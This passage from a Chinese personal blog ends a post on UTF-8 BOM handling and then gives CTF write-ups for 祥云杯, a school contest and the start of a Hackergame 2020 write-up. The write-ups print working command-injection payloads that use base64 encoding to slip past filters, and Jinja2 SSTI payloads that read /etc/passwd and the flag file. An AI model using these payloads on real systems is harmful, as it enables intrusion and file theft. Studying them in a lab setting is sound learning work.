相同的是，UTF-16-BE 和 UTF-16-LE 也可以不需要 BOM（也许都不需要，但若是如此则需要自己判断类型）</p><p>并且还发现了一个出乎意料并且有意思的东西</p><pre><code>&#39;abc&#39;.encode(&#39;utf-16&#39;)# output: b&#39;\xff\xfea\x00b\x00c\x00&#39;&#39;abc&#39;.encode(&#39;utf-16&#39;).decode(&#39;utf-16-le&#39;)# output: &#39;\ufeffabc&#39;&#39;abc&#39;.encode(&#39;utf-16&#39;).decode(&#39;utf-16-be&#39;)# output: &#39;\ufffe愀戀挀&#39;</code></pre><p>以上代码使用<code>utf-16</code>编码出来的头为<code>\xff\xfe</code>，而在使用<code>utf-16-le</code>解码却出现了<code>\ufeff</code>，可能的推测就是<code>utf-16-le</code>对<code>utf-16</code>编码的字符的处理相对于<code>utf-16-be</code>是对每两个十六进制数交换了一下位置</p><p>还有处地方很神奇了，此前我一直以为 UTF-16 decode 和 UTF-16-LE decode 是一样的效果，在这里居然多了个<code>\ufeff</code>，略微试试才发现<code>utf-16 encode</code>和<code>utf-16-le encode</code>是不一样的，<strong>并且<code>utf-16-le decode</code>不会处理<code>\xff\xfe</code></strong></p><p>但是以下代码却出乎我的意料</p><pre><code>&#39;\xef\xbb\xbf&#39;.encode(&#39;utf-16&#39;).decode(&#39;utf-16&#39;)output: &#39;ï»¿&#39;</code></pre><p>很多人可能不知道<code>ï»¿</code>是什么符号，但我曾经在<code>burp</code>见过</p><p>它就是在某些软件中载入<code>utf-8 with bom</code>文件时，首行被错误识别的字符！</p><p>再尝试</p><pre><code>&#39;\xef\xbb\xbf&#39;.encode(&#39;utf-8&#39;)&#39;ï»¿&#39;.encode(&#39;utf-8&#39;)</code></pre><p>它们的输出都是</p><pre><code>b&#39;\xc3\xaf\xc2\xbb\xc2\xbf&#39;</code></pre><p><code>ï»¿</code>的十进制为 239 187 191，它实际上就对应<code>EF BB BF</code>，只不过 UTF-8 错误地将它当成字符解释了出来</p><h2 id="综上我们可以得出以下三点结论"><a href="#综上我们可以得出以下三点结论" class="headerlink" title="综上我们可以得出以下三点结论"></a>综上我们可以得出以下三点结论</h2><ul><li>UTF-8 的 BOM 会被识别它自身识别成<code>ï»¿</code>（这并不是乱码）</li><li>对<code>EF BB BF</code>的编码有如下特征<ul><li>直接使用 UTF-8 decode，它会变成<code>\ufeff</code></li><li>先执行 UTF-8 encode，再执行 UTF-8 decode，它会变成<code>ï»¿</code></li><li>先执行 UTF-16 encode，再执行 UTF-16 decode，它会变成<code>ï»¿</code></li><li>先执行 UTF-16 encode，再执行 UTF-16-LE decode，他会变成<code>\ufeffï»¿</code>（最奇怪的地方）</li></ul></li><li><code>\ufeff</code>会在以下情况出现<ul><li><code>b&#39;\xef\xbb\xbf&#39;.decode(&#39;utf-8&#39;)</code></li><li><code>&#39;&#39;.encode(&#39;utf-8-sig&#39;).decode(&#39;utf-8&#39;)</code></li><li><code>&#39;&#39;.encode(&#39;utf-16&#39;).decode(&#39;utf-16-le&#39;)</code></li></ul></li></ul><p><strong>注意点：</strong></p><ul><li><code>utf-16 encode</code>会给加上头部<code>\xff\xfe</code></li><li>而<code>utf-16-le encode</code>和<code>utf-16-be encode</code>并不会</li><li>并且<code>utf-16-le decode</code>和<code>utf-16-be decode</code>不会处理来自<code>utf-16 encode</code>加上的文件头</li></ul><h2 id="我对此的猜测"><a href="#我对此的猜测" class="headerlink" title="我对此的猜测"></a>我对此的猜测</h2><p>回归原题目：<strong>为什么读取 utf-8 with bom 的文件首行会出现<code>\ufeff</code>？并且某些软件会出现<code>ï»¿</code>？</strong></p><ul><li>第一种<ul><li>可能是编程软件中的<code>utf-8</code>处理带 BOM 编码文件时，有一种特殊的兼容性处理方式，就是在 BOM 之后的每一位十六进制符往后填充<code>\x00</code>，首部填充了<code>\xff\xfe</code>，将其转换为标准<code>utf-16</code>编码，再使用<code>utf-16-le decode</code>，而 BOM 的<code>EF BB BF</code>由于仅代表 Zero Width No-Break Space，可能存在某种特殊机制使其在<code>utf-16 encode</code>之前就变成了空字符，而<code>utf-16 encode</code>所加上的文件头<code>\xff\xfe</code>在<code>utf-16-le decode</code>后就变成了<code>\xfe\xff</code>，但这种可能也无法解释为什么<code>utf-8 without bom</code>编码文件在解码时不会被加上<code>\ufeff</code></li><li>可能<code>\xef\xbb\xbf</code>执行<code>utf-8 decode</code>就是<code>\ufeff</code>，但会有很多地方解释不清</li></ul></li><li>第二种<ul><li>可能是某些软件读取文件时，直接对十六进制内容进行<code>utf-8 decode</code>（或是<code>utf-16 decode</code>），导致 BOM 被当作文件一部分解释了出来，进而出现了<code>ï»¿</code></li></ul></li></ul><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p><strong>我本人不是很熟悉编码方面的原理，一切仅是推理</strong></p><p><strong>本文章也算是一个抛砖引玉吧，毕竟这一块找了挺多资料都没有很详细的记载</strong></p><p>说了那么多额外话题，最初的浏览器中文乱码问题的解决方法其实就是在<code>markdown viewer</code>设置中添加一项<code>http://localhost</code> match all 并且开启 encoding utf-8 就行了</p><p>限于时间，我没空再进行别的实验了，比如说添加响应头来看看浏览器会不会识别，实际上写这一篇文章已经耗了一个晚上</p><p><strong>小结一下就是：</strong><br>编程语言及各类常用应用中，使用 UTF-8 编码的文件可以被正常读取，而浏览器不行</p><p>使用 UTF-8 with BOM 可以正常被浏览器读取，而在大多数编程语言中需要进行额外处理，并且有一小部分软件无法识别 BOM（比如<code>burp</code>）</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>祥云杯 校赛 Write-up</title>
      <link href="archives/xiang-yun-bei-xiao-sai-ctf-write-up.html"/>
      <url>archives/xiang-yun-bei-xiao-sai-ctf-write-up.html</url>
      
        <content type="html"><![CDATA[<p>祥云杯 校内赛 Write-up</p><a id="more"></a><h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><blockquote><p>比赛时间：2020.11.21 9:00 - 2020.11.22 21:00<br>比赛形式：CTF</p></blockquote><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>ZmxhZ3txcV9ncm91cF84MjY1NjYwNDB9<br>目测<code>base64</code>加密，解密得到<code>flag</code></p><h2 id="还是原来的-Ping-？"><a href="#还是原来的-Ping-？" class="headerlink" title="还是原来的 Ping ？"></a>还是原来的 Ping ？</h2><p>网上稍微查查可以发现<code>ping</code>的命令绕过，这就是个命令绕过题</p><p>先试试输入<code>127.0.0.1|ls</code></p><p><img src="https://i.loli.net/2020/11/22/Q3tycqhxMoAHJ4Z.png" alt></p><p>有回显</p><p>接着试错过滤字符，<code>&lt;space&gt;</code>、<code>&amp;</code>、<code>&gt;</code>、<code>cat</code>、<code>&#39;</code>、<code>flag</code>等等被过滤了，但是<code>&quot;</code>、<code>%</code>、<code>\</code>并没有被过滤</p><p>那就构造<code>127.0.0.1|ca&quot;t&quot;&lt;./sou.js</code></p><p>有回显</p><p>接下来需要寻找<code>flag</code>，基本命令就是</p><pre><code>find / -name &quot;*flag*&quot;</code></pre><p>空格可以用<code>%09</code>进行绕过（<code>{}</code>也被过滤了，无法使用<code>{IFS}</code>），比较难解决的就是<code>flag</code>了，在<code>flag</code>掺杂<code>&quot;</code>、<code>/</code>、<code>\</code>均无法绕过，看来不是单纯的字符检测，那就使用<code>base64</code>试试</p><p>将上面的基本命令用<code>base64</code>加密得<code>ZmluZCAvIC1uYW1lICIqZmxhZyoi</code></p><p>构造如下<code>payload</code>进行尝试</p><pre><code>127.0.0.1|echo%09ZmluZCAvIC1uYW1lICIqZmxhZyoi|base64%09-d|bas\h</code></pre><p>基本原理就是利用管道符<code>|</code>将<code>echo</code>命令的值传给<code>base64</code>命令，<code>base64</code>对base64内容解密并传给<code>bash</code>命令</p><blockquote><p>可以说我就是在这里卡住了，因为没有任何输出信息<br>后来朋友提示了我说把<code>payload</code>放到<code>url</code>输入试试，结果惊奇发现有了回显，才反应过来浏览器自动对特殊字符进行了<code>url</code>编码，而<code>linux</code>并不会自动将<code>%25</code>自动替换成<code>%</code>或者将<code>%7C</code>自动替换成<code>|</code>之类的，这就导致了无回显</p></blockquote><p>回显如下（我手动对齐了一下）</p><pre><code>Result:/sys/devices/platform/serial8250/tty/ttyS0/flags/sys/devices/platform/serial8250/tty/ttyS1/flags/sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags/sys/devices/virtual/net/lo/flags/sys/devices/virtual/net/dummy0/flags/sys/module/scsi_mod/parameters/default_dev_flags/usr/lib/perl/5.18.2/bits/waitflags.ph/etc/.findflag/etc/.findflag/flag.txt/proc/sys/kernel/sched_domain/cpu0/domain0/flags/proc/sys/kernel/sched_domain/cpu1/domain0/flags/proc/kpageflags</code></pre><p><code>/etc/.findflag/flag.txt</code>便是<code>flag</code>所在位置了，先记下来</p><p>既然对<code>flag</code>过滤了，那么接下来<code>cat</code>也需要使用<code>base64</code>进行构造</p><p>执行命令为</p><pre><code>ca\t /etc/.findf\lag/f\lag.txt</code></pre><p><code>base64</code>加密得<code>Y2FcdCAvZXRjLy5maW5kZlxsYWcvZlxsYWcudHh0</code></p><p>最终<code>payload</code>为</p><pre><code>127.0.0.1|echo%09Y2FcdCAvZXRjLy5maW5kZlxsYWcvZlxsYWcudHh0|base64%09-d|bas\h</code></pre><p>取得<code>flag</code></p><pre><code>Result:flag{9f1a16d4-5f5c-4104-8e18-6c73621531ef} </code></pre><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>这是一道<code>SSTI</code>题</p><blockquote><p>SSTI: Server-Side Template Injection</p></blockquote><p><img src="https://i.loli.net/2020/11/22/FcEyoiag4tLQHZ7.jpg" alt></p><p>试着输入<code>username</code>: iyume</p><p><img src="https://i.loli.net/2020/11/22/AlV4NgpGeWSmRJb.jpg" alt></p><p>试着输入<code>num</code>: 777</p><p>会出来一个 html 纯文本页面</p><pre><code>1:500000000.0 is too large2:250000000.0 is too large3:125000000.0 is too large4:62500000.0 is too large5:31250000.0 is too large6:15625000.0 is too large7:7812500.0 is too large8:3906250.0 is too large9:1953125.0 is too large10:976562.5 is too large11:488281.25 is too large12:244140.625 is too large13:122070.3125 is too large14:61035.15625 is too large15:30517.578125 is too large16:15258.7890625 is too large17:7629.39453125 is too large18:3814.69726562 is too large19:1907.34863281 is too large20:953.674316406 is too large21:476.837158203 is too small22:715.255737305 is too small23:834.465026855 is too large24:774.86038208 is too small25:804.662704468 is too large26:789.761543274 is too large27:782.310962677 is too large28:778.585672379 is too large29:776.723027229 is too small30:777.654349804 is too large31:777.188688517 is too large32:776.955857873 is too small33:777.072273195 is too large34:777.014065534 is too large35:776.984961703 is too small36:776.999513619 is too small37:777.006789576 is too large38:777.003151597 is too large39:777.001332608 is too large40:777.000423113 is too large41:776.999968366 is too small42:777.00019574 is too large43:777.000082053 is too large44:777.000025209 is too large45:776.999996788 is too small45:776.999996788 is close enoughI win</code></pre><p>二分法逼近，数字肯定无法胜利，寻找别的方法</p><p>首先是信息搜集，利用<code>debugger</code>的栈查看上下文，尝试<code>input num type error</code>、<code>404</code>、<code>username error</code>，分别出现三个报错页面，如下图</p><p><img src="https://i.loli.net/2020/11/22/nEYyPNcwakvSAp1.png" alt></p><ul><li>input num type error</li></ul><blockquote><p>信息点：对输入的<code>username</code>进行了<code>base64</code>加密并储存在<code>cookie:user</code>内，然后访问的时候会取得<code>cookie:user</code>内的值进行解密并储存在<code>name</code>这个内部变量</p></blockquote><p><img src="https://i.loli.net/2020/11/22/rw9SfOjToihaI35.png" alt></p><ul><li>404</li></ul><blockquote><p>信息点：有一个<code>render_template_string()</code>，极大可能是注入点，它的传参是使用<code>%s</code>获取的，因此可以注入模板，<code>guessNum()</code>应该就是猜数字的函数，传参为<code>num</code>和<code>name</code>，<code>name</code>就是在上一个信息点得知的<code>username</code>，但是显然他并没有打印出任何与<code>name</code>相关的东西，比如<code>iyume vs bot</code>之类的，有可能是在人胜利时才会输出</p></blockquote><p><img src="https://i.loli.net/2020/11/22/4RskbdwxZ81uiD5.png" alt></p><ul><li>username error</li></ul><blockquote><p>信息点：有一个<code>render_template()</code>，但这个调用模板的函数并不像<code>render_template_string()</code>，它的传参是变量取值的形式，任何字符都无法注入，硬要说注入的话只可能是第一个参数（但一般没有人会去让用户控制网页名吧），因此这只能当作一个无用信息点</p></blockquote><p>根据第二点，试着把<code>cookie:user</code>改成比如<code>e3syKjd9fQ==</code>(base64decode=14)</p><p><img src="https://i.loli.net/2020/11/23/b3ovG1DERkejutX.jpg" alt></p><p>因为是<code>render_template()</code>输出的这个页面，<code>payload</code>的回显合乎情理</p><p>另寻途径</p><p><code>Python Numpy</code>中有一种空值类型<code>(float)NaN</code>，它与任何数进行任何比较都会返回<code>false</code>，那试着在数字框输入<code>NaN</code></p><pre><code>1:500000000.0 is too small2:750000000.0 is too small...51:1000000000.0 is too smallWow! Damn you hacker! You will never win.</code></pre><p>看来这里是我赢了，但是可能<code>payload</code>中有特殊字符被过滤了</p><p>把<code>cookie:user</code>的值换成<code>e3syfX0=</code>(decode=2)</p><pre><code>Wow! 2 win.</code></pre><p>输出了我的胜利，并且<code>\{\{2\}\}</code>成功被渲染成了<code>2</code></p><p><strong>至此，<code>SSTI</code>注入点确定</strong></p><p>接下来有两种思路</p><ul><li>直接寻找<code>flag</code>并读取</li><li>收集系统信息生成<code>pin</code>码<code>hack shell</code></li></ul><h3 id="Pin-码-Getshell"><a href="#Pin-码-Getshell" class="headerlink" title="Pin 码 Getshell"></a>Pin 码 Getshell</h3><blockquote><p>先讲讲第二种，因为我没能成功</p></blockquote><ul><li>生成<code>pin</code>所需系统信息（算法不贴了）<ol><li>username</li><li>modname</li><li>app.__class__.’__name__‘</li><li>app_path</li><li>eth0_mac</li><li>machine-id</li></ol></li></ul><p>在报错页面已经取得了信息<code>2</code>、<code>3</code>、<code>4</code></p><p>基本构造</p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}</code></pre><p>成功得到回显</p><pre><code>Wow! root:x:0:0:root:/root:/bin/ash bin:x:1......spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin win.</code></pre><p>信息<code>1</code>应该就是<code>guest</code>了</p><p>接着构造</p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/sys/class/net/eth0/address').read()}}</code></pre><p>得到回显<code>00:16:3e:03:ee:c0</code></p><p>在<code>python shell</code>执行<code>print(0x00163e03eec0)</code>即可获取信息<code>5</code></p><p>接着构造</p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/machine-id').read()}}</code></pre><p>返回<code>debugger</code>提示<code>No Such file or dir</code>，又试了试<code>/var/lib/dbus/machine-id</code>，还是没有此文件，后来去列了一下目录，发现根本没有这个文件，看来是被动了手脚…以 <strong>失败</strong> 告终</p><h3 id="直接寻找-flag"><a href="#直接寻找-flag" class="headerlink" title="直接寻找 flag"></a>直接寻找 flag</h3><p>构造</p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('/')}}</code></pre><p>被过滤了</p><p>排查后发现被过滤的字符是<code>os</code>，那就替换成<code>&#39;o&#39;+&#39;s&#39;</code></p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['o'+'s'].listdir('/')}}</code></pre><p>成功得到回显</p><pre><code>[&#39;proc&#39;, &#39;home&#39;, &#39;mnt&#39;, &#39;dev&#39;, &#39;srv&#39;, &#39;usr&#39;, &#39;sys&#39;, &#39;var&#39;, &#39;opt&#39;, &#39;bin&#39;, &#39;sbin&#39;, &#39;etc&#39;, &#39;run&#39;, &#39;media&#39;, &#39;tmp&#39;, &#39;root&#39;, &#39;lib&#39;, &#39;super_secret_flag.txt&#39;, &#39;app&#39;]</code></pre><p>显然<code>super_secret_flag.txt</code>就是 target 了</p><p>但它也对<code>flag</code>进行了过滤</p><p>那么构造如下<code>payload</code></p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/sup'+'er_se'+'cret_fl'+'ag.txt').read()}}</code></pre><p>得到回显</p><pre><code>Wow! flag{4e713984-b085-412d-8b8b-c95bbf4f44b9} win.</code></pre><p><strong>成功取得<code>flag</code></strong></p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul><li>模板对<code>system</code>关键字进行了过滤，因此继承类<code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71]</code>下调用<code>os.system</code>是没用的，目前没有绕过方案</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>祥云杯的水份还是挺高的，题目共有 31 道</p><ul><li>Misc 6</li><li>Crypto 6</li><li>PWN 6</li><li>Reverse 7</li><li>Web 6</li></ul><p>除了签到题，基本每道题都非常难，也非常有意思（</p><p>Misc 有一道题目叫做<code>进制反转</code>，我的基本思路是<code>CRC 修复</code>然后解压文件进行二进制按位取反？正拿着<code>python</code>提取了<code>16进制</code>数据，又听大佬说<code>硬解 au 原始数据导入倒放 x.5 然后搜歌词</code>，我就停手了（菜死了</p><p>比赛过程还学了一下<code>RSA</code>加密原理，虽然最后还是不会解题（</p><p>对了，这个比赛的积分制度是<code>一血</code>（没有额外奖励）、以及<code>动态积分模式</code>（根据解出题目的队伍数减少相应的分值）</p><p>关于组队，因为我也没加入协会（还没开始纳新），然后就个人参赛了。此外我们学校我所知的还有很多队伍，第一的那队解题数量<code>11</code>，排名好像是省内高校<code>14</code>，但省内高校出赛名额只有<code>3</code>个，所以我们学校也没有队伍晋级线下赛。</p><p>至于我的排名，解题数量<code>4</code>，积分<code>179</code>，我只知道是校内第<code>5</code>，省内高校估计排到<code>80</code>多的样子</p><p>校内赛的预赛已经过了，决赛形式是<code>CTF</code>+<code>AWD</code>，还没开始，因此做保留</p><p>还想到别的什么再作补充</p><h1 id="校赛"><a href="#校赛" class="headerlink" title="校赛"></a>校赛</h1><blockquote><p>比赛时间：2020-12-06 9:00-11:30, 14:00-15:30<br>比赛形式：CTF + AWD</p></blockquote><p>其实只有 CTF 可以讲，AWD 完全不会玩。</p><p>而且题目名称很多都忘了…就随便写了</p><h2 id="Not-only-base64"><a href="#Not-only-base64" class="headerlink" title="Not only base64"></a>Not only base64</h2><p>7JJ3vECw1FBbqNxmQrcrd8toHvUiY</p><p>听题目名字就知道这是 base 系的加解密</p><p>目测没什么特征，一个一个试，最终是用 base58 解出来了</p><pre><code>flag{n0t_on1y_base64}</code></pre><p>base58 很多人可能不知道这是什么，因为在日常生活确实不常见，但并不代表它用处不大，实际上比特币的钱包地址和私钥都是 base58 加密生成的。</p><h2 id="Web-第二题"><a href="#Web-第二题" class="headerlink" title="Web 第二题"></a>Web 第二题</h2><p>就是一道基础题，直接 hackbar 都可以解决，没有环境不讲了</p><h2 id="Web-第三题"><a href="#Web-第三题" class="headerlink" title="Web 第三题"></a>Web 第三题</h2><blockquote><p>有时候阅读文档是一件很重要的事情</p></blockquote><p>由于出题人的锅，这题端口号给错了，导致我以为这是一道 0day，搞了好半天。后来比赛结束了直接就去问了出题人，他也是才发现端口给错了。不过后来用正确的端口号为我们讲解了一下题目。</p><p>没有环境，我就随便说说算了。</p><p>网页中提示我们去看文档，并且给了个 GET 参数，值是一个函数。提交这个参数会调用对应的函数。那就需要一个可以返回所有函数的函数，这时候去读文档，可以发现 get_defined_functions 这个函数可以满足需求，于是直接 GET，只返回了一个函数，就是获取 flag 的函数，再调用一次就拿到了 flag</p><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h2><p>给了个 jpg 图片，查看属性-详细信息，描述里就写着 flag</p><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h2><p>给了个 jpg 图片，直接点开发现是不支持的格式，直接改后缀 zip，里面有 50 张二维码图片，扫码试试得不到 flag，但是发现了一张体积异常的图片，解压出来查看属性-详细信息，得到 base64 字符串，解密得 flag</p><h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc 3"></a>Misc 3</h2><h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc 4"></a>Misc 4</h2><p>这两题异曲同工，都是 zip 伪加密、高级伪加密，binwalk 一梭子解决。</p><p>好吧，其实我不是这么解的。我的解法很蠢。</p><p>用 010 Editor 打开 zip，把 Misc 3 的目录加密位、文件加密位改掉就可以直接打开了。把 Misc 4 的伪加密也全部去掉，但是并不能打开，直接手动提取 16 进制，把第二个文件 Tips.txt 解压了出来可以直接打开，但是第一个文件 flag.txt 还是有加密无法打开，后来发现是我漏了一处伪加密没有去掉。</p><p>Tips.txt 写了字频统计，那就对 flag.txt 进行字频统计呗。这里其实最好使用自己的脚本，因为在线的大多不支持长字符串。</p><p>Misc 5 同样也是伪加密，全部去掉解压，可以发现 flag.txt 里面写了一些描述，我记得有<code>86</code>、<code>QQMusic</code>、<code>给我一杯牛奶</code>之类的，是一道社工题，打开 QQ 音乐搜就是了，一般就是第 86 号里写的那个评论。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>想什么呢。我不会逆向，连 IDA 都没装。</p><h2 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h2><p>为了准备 AWD 比赛，我甚至自己搭建了一个环境分享给学长一起来玩。</p><p>地址：</p><pre><code>https://github.com/mo-xiaoxi/AWD_CTF_Platform</code></pre><p>实际到比赛的时候，我也挺傻的，我在比赛结束前 10min 才发现每队的 root 账密就在大屏幕上写着，因为整个比赛就 1h30min，因为我太傻就基本都在划水…只能看着别的队伍拿分，还在想对方到底是怎么通过那个 Web 服务拿到 shell 的</p><p>Web 服务有个注入漏洞，进入管理页面可以发现很明显的文件包含漏洞。不过发现的时候，已经比赛快结束了。</p><p>以及，比赛服务器太弱鸡了，全场都没怎么快过。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame-2020 Write-up</title>
      <link href="archives/hackergame-2020-write-up.html"/>
      <url>archives/hackergame-2020-write-up.html</url>
      
        <content type="html"><![CDATA[<p>这应该是我第一次参加 CTF，写下一些自己的做题思路吧</p><a id="more"></a><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>此前从来没参加过 CTF、信安赛之类的，真要说类似的就是解一些过年时我所关注的各位大佬发的红包谜题了。</p><p>反正就一直对 CTF 抱有很大的念想。虽说 USTC 这个只有个人赛，不过早就听说其难度老少皆宜了，大学后可支配时间也多了，作为我的第一次比赛正好。</p><p>大佬们就没必要看了（</p><h2 id="Q-List"><a href="#Q-List" class="headerlink" title="Q List"></a>Q List</h2><ul><li>签到</li><li>猫咪问答++</li><li>2048</li><li>一闪而过的 Flag</li><li>从零开始的记账工具人</li><li>超简单的世界模拟器(2)</li><li>从零开始的火星文生活</li><li>自复读的复读机(2)</li><li>233 同学的字符串工具</li><li>233 同学的 Docker</li><li>从零开始的 HTTP 链接</li><li>来自一教的图片</li><li>超简陋的 OpenGL 小程序</li><li>生活在博弈树上(2)</li><li>来自未来的信笺</li><li>狗狗银行</li><li>超基础的数理计算器</li><li>永不溢出的计算器</li><li>普通的身份认证器</li><li>超精巧的数字论证器</li><li>超自动的开箱模拟器</li><li>室友的加密硬盘</li><li>超简易的网盘服务器</li><li>超安全的代理服务器(2)</li><li>证验码</li><li>动态链接库检查器</li><li>超精准的宇宙射线模拟器</li><li>超迷你的挖矿模拟器</li><li>Flag 计算机</li><li>中间人(2)</li><li>不经意传输(2)</li></ul><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>选手要多少个 flag，我就给多少个 flag，绿色背景，红色加粗，显眼的位置，标准的格式，这都不叫送，那还有什么叫做送。<br>点击 「打开/下载题目」 按钮，打开 flag 提取器，获取第一个 flag 吧！</p></blockquote><p><img src="https://i.loli.net/2020/11/05/pzZdqPi69kGKu8y.png" alt></p><p>直接滑动是滑不到<code>1</code>的</p><p>让我们打开控制台看看</p><p><img src="https://i.loli.net/2020/11/05/52XQa8pzIlBW9mn.png" alt></p><p>定位到滑动块的元素，可以发现这个<code>step</code>属性值很奇怪，把它给改成<code>1</code>、<code>0.5</code>、<code>0.1</code>之类的值再滑动一下，就发现可以定位到 <code>1</code> 了，再点提取</p><p>第一个 Flag 就得到了</p><h3 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答++"></a>猫咪问答++</h3><blockquote><p>这题其实我是留到第二天才做的</p></blockquote><p><a href="https://i.loli.net/2020/11/05/pfAlS3bKj7hHmoa.png" rel="noopener" target="_blank">点此查看题目截图</a></p><p>此题考察搜索引擎的使用能力。</p><p>先说说答案吧，从第一问到第五问分别是<code>12</code>、<code>256</code>、<code>9</code>、<code>9</code>、<code>17098</code>。</p><p>我当时没能查到第一题和第二题，第四题一开始用错成了谷歌全景，后来被朋友指点才发现要用百度全景。</p><p>这是当时用 Python 写的遍历</p><pre><code>from selenium import webdriverfrom selenium.webdriver.common.keys import Keysfrom selenium.common.exceptions import NoSuchElementExceptionimport timeimport requestsbs = webdriver.Firefox()bs.get(&quot;http://202.38.93.111:10001/?token=1294%3AMEYCIQDGGgsw4ZIS8VYoonINuZNHwWagU8HonbAS8xibpRsb8QIhAMtC8zWSEbqwPOgmgaix0hzT%2Bho30JdIC8fp%2B1Uojwdg&quot;)bs.find_element_by_xpath(&quot;/html/body/form/div/div[1]/div/div[2]/input&quot;).click()bs.find_element_by_xpath(&quot;/html/body/form/div/div[1]/div/div[2]/input&quot;).send_keys(str(0))time.sleep(0.2)bs.find_element_by_xpath(&quot;/html/body/form/div/div[2]/div/div[2]/input&quot;).click()bs.find_element_by_xpath(&quot;/html/body/form/div/div[2]/div/div[2]/input&quot;).send_keys(str(0))time.sleep(0.2)bs.find_element_by_xpath(&quot;/html/body/form/div/div[3]/div/div[2]/input&quot;).click()bs.find_element_by_xpath(&quot;/html/body/form/div/div[3]/div/div[2]/input&quot;).send_keys(str(0))time.sleep(0.2)bs.find_element_by_xpath(&quot;/html/body/form/div/div[4]/div/div[2]/input&quot;).click()bs.find_element_by_xpath(&quot;/html/body/form/div/div[4]/div/div[2]/input&quot;).send_keys(str(0))time.sleep(0.2)bs.find_element_by_xpath(&quot;/html/body/form/div/div[5]/div/div[2]/input&quot;).click()bs.find_element_by_xpath(&quot;/html/body/form/div/div[5]/div/div[2]/input&quot;).send_keys(str(0))time.sleep(0.2)bs.find_element_by_xpath(&quot;/html/body/form/div/input&quot;).click()time.sleep(1)# 用眼睛看吧，不想写字符串识别了for i in range(12, 23):    bs.find_element_by_xpath(&quot;/html/body/form/div/div[2]/div/div[2]/input&quot;).click()    bs.find_element_by_xpath(&quot;/html/body/form/div/div[2]/div/div[2]/input&quot;).send_keys(str(i))    time.sleep(0.2)    bs.find_element_by_xpath(&quot;/html/body/form/div/div[3]/div/div[2]/input&quot;).click()    bs.find_element_by_xpath(&quot;/html/body/form/div/div[3]/div/div[2]/input&quot;).send_keys(str(256))    time.sleep(0.2)    bs.find_element_by_xpath(&quot;/html/body/form/div/div[4]/div/div[2]/input&quot;).click()    bs.find_element_by_xpath(&quot;/html/body/form/div/div[4]/div/div[2]/input&quot;).send_keys(str(9))    time.sleep(0.2)    bs.find_element_by_xpath(&quot;/html/body/form/div/div[5]/div/div[2]/input&quot;).click()    bs.find_element_by_xpath(&quot;/html/body/form/div/div[5]/div/div[2]/input&quot;).send_keys(str(9))    time.sleep(0.2)    bs.find_element_by_xpath(&quot;/html/body/form/div/div[6]/div/div[2]/input&quot;).click()    bs.find_element_by_xpath(&quot;/html/body/form/div/div[6]/div/div[2]/input&quot;).send_keys(str(17098))    time.sleep(0.2)    print(i)    bs.find_element_by_xpath(&quot;/html/body/form/div/input&quot;).click()    time.sleep(1)# keyboard interrupt 后第一问答案为 12</code></pre><blockquote><p>写的很丑，但既然用到了，那就写进 Write-up</p></blockquote><p><img src="https://i.loli.net/2020/11/06/FR7QMYHPUn3ilNj.png" alt></p><p>最终得到第二题的 Flag</p><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><blockquote><p>要实现 FLXG，你需要过人的智慧，顽强的意志，和命运的眷属。只有在 2048 的世界里证明自己拥有这些宝贵的品质，实现「大成功」，你才有资格扛起 FLXG 的大旗。</p></blockquote><p>一个并不寻常的 2048</p><p>我一开始真的就玩了起来…然后玩到<code>炸毁金矿</code>我心态就跟着炸了，这 TM 怎么还没结束啊（</p><p>我当时也挺呆的，就写了个脚本让它自己跑…emm</p><pre><code>from selenium import webdriverfrom selenium.webdriver.common.keys import Keysfrom selenium.common.exceptions import NoSuchElementExceptionimport timeimport requests# 打开firefox，并访问2048游戏界面bs = webdriver.Firefox()bs.get(&quot;http://202.38.93.111:10005/&quot;)bs.find_element_by_name(&quot;token&quot;).click()bs.find_element_by_name(&quot;token&quot;).send_keys(&quot;1294:MEYCIQDGGgsw4ZIS8VYoonINuZNHwWagU8HonbAS8xibpRsb8QIhAMtC8zWSEbqwPOgmgaix0hzT+ho30JdIC8fp+1Uojwdg&quot;)bs.find_element_by_xpath(&quot;/html/body/form/input[2]&quot;).click()html = bs.find_element_by_tag_name(&#39;html&#39;)while True:    # 每四个方向操作后判断游戏是否结束    print(&#39;send up,right,down,left&#39;)    html.send_keys(Keys.UP)    time.sleep(0.2)    html.send_keys(Keys.RIGHT)    time.sleep(0.2)    html.send_keys(Keys.DOWN)    time.sleep(0.2)    html.send_keys(Keys.LEFT)    time.sleep(0.2)    game_over = 